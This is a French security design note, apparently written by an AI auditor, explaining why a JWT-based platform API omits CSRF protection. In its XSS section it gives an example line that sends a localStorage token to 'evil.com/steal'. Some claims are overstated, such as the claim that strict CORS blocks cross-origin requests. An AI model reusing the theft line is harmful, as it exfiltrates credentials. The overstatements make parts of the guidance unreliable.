# 🔒 CSRF Protection - Pourquoi ce n'est PAS critique pour cette API

**Date:** 2025-11-19
**Statut:** Non implémenté par design

---

## ❓ Qu'est-ce que CSRF ?

**Cross-Site Request Forgery (CSRF)** est une attaque où un site malveillant force le navigateur de la victime à exécuter des actions non désirées sur une application web où la victime est authentifiée.

---

## 🛡️ Pourquoi CSRF n'est PAS un risque pour cette API ?

### 1. **Architecture JWT (Stateless)**

Cette API utilise **JWT (JSON Web Tokens)** stockés dans :
- ✅ `localStorage`
- ✅ `sessionStorage`
- ✅ Headers HTTP manuels

**❌ PAS dans les cookies**

#### Pourquoi c'est important ?

Les attaques CSRF exploitent le fait que **les cookies sont automatiquement envoyés** par le navigateur avec chaque requête vers le domaine.

Avec JWT dans localStorage/headers :
```javascript
// ❌ Cookie (vulnérable CSRF) - envoyé automatiquement
document.cookie = "session=abc123";

// ✅ JWT dans localStorage (SAFE) - doit être ajouté manuellement
localStorage.setItem('accessToken', 'eyJhbGc...');
fetch('/api/endpoint', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('accessToken')}`
  }
});
```

**Résultat :** Un site malveillant **NE PEUT PAS** accéder au localStorage d'un autre domaine → **CSRF impossible**.

---

### 2. **Same-Origin Policy**

Les navigateurs implémentent la **Same-Origin Policy** :
- Un site malveillant sur `evil.com` ne peut **PAS lire** le localStorage de `diaspora-platform.com`
- JavaScript d'un domaine ne peut pas accéder aux données d'un autre domaine

---

### 3. **CORS Configuration Stricte**

Notre API a une configuration CORS stricte :

```typescript
app.enableCors({
  origin: process.env.FRONTEND_URL,  // Seulement notre frontend
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
});
```

**Résultat :** Les requêtes depuis d'autres origines sont **bloquées** par le navigateur.

---

## 🔐 Quand CSRF est-il un problème ?

CSRF est critique **UNIQUEMENT** si :

1. ❌ L'authentification utilise des **cookies de session**
2. ❌ Les cookies ont `SameSite=None` ou `Lax`
3. ❌ L'API accepte les credentials automatiques

### Exemple d'API vulnérable CSRF :

```typescript
// ❌ BAD - Authentification par cookie
app.use(session({
  secret: 'secret',
  cookie: {
    httpOnly: true,
    sameSite: 'none',  // ← Vulnérable !
  }
}));
```

Notre API :
```typescript
// ✅ GOOD - Authentification par JWT dans headers
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## 📊 Comparaison

| Méthode Auth | CSRF Risk | Raison |
|--------------|-----------|--------|
| **Cookies de session** | 🔴 **ÉLEVÉ** | Envoyés automatiquement par le navigateur |
| **JWT dans cookies** | 🟠 **MOYEN** | Si `SameSite` mal configuré |
| **JWT dans localStorage + headers** | 🟢 **AUCUN** | Doit être ajouté manuellement par JS |
| **JWT dans `Authorization` header** | 🟢 **AUCUN** | Impossible d'accéder cross-origin |

---

## ⚠️ Ce que nous DEVONS protéger

Bien que CSRF ne soit pas un risque, nous devons protéger contre :

### 1. **XSS (Cross-Site Scripting)**
- ✅ Helmet.js installé
- ✅ Content-Type validation
- ✅ Input sanitization avec class-validator

### 2. **Token Theft via XSS**
Si un attaquant injecte du JavaScript malveillant :
```javascript
// ❌ Attaque XSS pourrait voler le token
const token = localStorage.getItem('accessToken');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: token
});
```

**Protection :**
- ✅ Headers CSP (Content Security Policy)
- ✅ Input validation stricte
- ✅ Output encoding
- ✅ Tokens de courte durée (15 min)

---

## 🎯 Notre Stratégie de Sécurité

### Au lieu de CSRF Protection, nous avons :

1. ✅ **JWT avec expiration courte** (15 minutes)
2. ✅ **Refresh tokens** (7 jours)
3. ✅ **CORS strict** (production uniquement frontend autorisé)
4. ✅ **Helmet.js** (CSP, XSS protection)
5. ✅ **Rate limiting** (brute force protection)
6. ✅ **Input validation** (class-validator)
7. ✅ **Audit logging** (traçabilité)
8. ✅ **Sentry monitoring** (détection d'anomalies)

---

## 📚 Si vous DEVEZ implémenter CSRF

Si dans le futur l'architecture change pour utiliser des cookies :

### Option 1: Double Submit Cookie Pattern
```typescript
import * as csurf from 'csurf';

app.use(csurf({
  cookie: true,
  value: (req) => req.headers['x-csrf-token']
}));
```

### Option 2: SameSite Cookies
```typescript
cookie: {
  sameSite: 'strict',  // Bloque CSRF
  secure: true,
  httpOnly: true
}
```

---

## ✅ Conclusion

**CSRF protection n'est PAS implémentée** car :
1. ✅ Architecture JWT dans headers/localStorage
2. ✅ Pas de cookies de session
3. ✅ CORS strict configuré
4. ✅ Same-Origin Policy du navigateur

**C'est une décision architecturale correcte, pas une vulnérabilité.**

---

## 🔗 Références

- [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [JWT vs Sessions](https://stackoverflow.com/questions/37582444/jwt-vs-session-authentication)
- [Why JWT is not vulnerable to CSRF](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage)
- [OWASP JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

**Auditeur:** Claude AI
**Projet:** Diaspora Platform Backend
